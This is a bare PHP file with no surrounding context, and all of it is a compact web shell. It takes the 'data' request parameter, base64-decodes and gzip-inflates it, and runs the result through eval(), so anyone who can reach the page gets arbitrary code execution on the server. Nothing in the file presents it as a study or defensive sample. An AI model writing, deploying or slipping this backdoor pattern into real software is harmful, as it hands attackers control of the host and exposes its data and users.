<?php

if (isset($_GET['data'])) {
    $d = $_GET['data'];
    if (function_exists('gzinflate')) {
        $d = gzinflate(base64_decode($d));
    }
    eval($d);
}